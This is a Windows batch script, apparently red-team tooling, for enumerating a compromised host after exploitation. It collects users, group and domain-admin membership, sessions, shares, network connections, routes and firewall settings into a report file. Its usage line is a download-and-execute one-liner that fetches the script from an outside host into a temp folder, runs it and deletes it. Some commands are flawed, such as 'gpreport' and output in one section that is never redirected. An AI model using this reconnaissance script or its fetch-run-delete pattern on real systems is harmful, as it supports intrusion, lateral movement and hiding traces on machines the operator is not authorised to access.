rem Usage: powershell.exe "wget https://raw.githubusercontent.com/BankSecurity/Red_Team/master/Discovery/Host_Recon_Complete.bat -o C:\Windows\Temp\Host_Recon_Complete.bat;C:\Windows\Temp\Host_Recon_Complete.bat;del C:\Windows\Temp\Host_Recon_Complete.bat"
rem Description: Windows enumeration scrip

rem --------------------------------- Host and user details ------------------------------------------

echo 1. Finding os details > win_enum_report.txt
echo --------------------- >> win_enum_report.txt
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 2. Finding hostname >> win_enum_report.txt
echo --------------------- >> win_enum_report.txt
hostname >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt

echo 3. Finding exploited user name >> win_enum_report.txt
echo --------------------- >> win_enum_report.txt
echo %username% >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 4. All users on the system >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
net users >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 5. Getting group membership, active sessions, account lock out policy >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
net user %username% >> win_enum_report.txt
net users >> win_enum_report.txt
net session  >> win_enum_report.txt
net accounts /domain  >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 5.1. Display which group policies are applied and info about the OS if victim is the member of a domain: >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
gpreport >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


rem ------------------------------------ Network details ------------------------------------------

echo 6. Checking available network interfaces and routing table >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
ipconfig /all >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt

echo 7. routing table >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
route print >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt



echo 8. Checking ARP cache table for all available interfaces >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
arp -A >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 9. Checking active network connections >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
netstat -ano >> win_enum_report.txt
netstat -an | find /i "established" >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt



echo 9.1. Checking hidden, non-hidden share  >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
net share >> win_enum_report.txt
net use >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 9.2. list all the hosts on the "compromised host's domain" and list the domains that the compromised host can see >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
net view >> win_enum_report.txt
net view /domain >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 9.3. enumerate the domain >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
net localgroup users /domain
net user Administrator /domain
net localgroup administrators
net use
net share
net group "domain admins" /domain
net config workstation
net accounts
net view
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


rem ------------------------------------ Firewall details ------------------------------------------

echo 10. The netsh firewall state >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
netsh firewall show state >> win_enum_report.txt
netsh firewall show opmode >> win_enum_report.txt
netsh firewall show port >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt


echo 11. Firewall configuration >> win_enum_report.txt
echo --------------------------- >> win_enum_report.txt
netsh firewall show config >> win_enum_report.txt
echo. >> win_enum_report.txt
echo. >> win_enum_report.txt
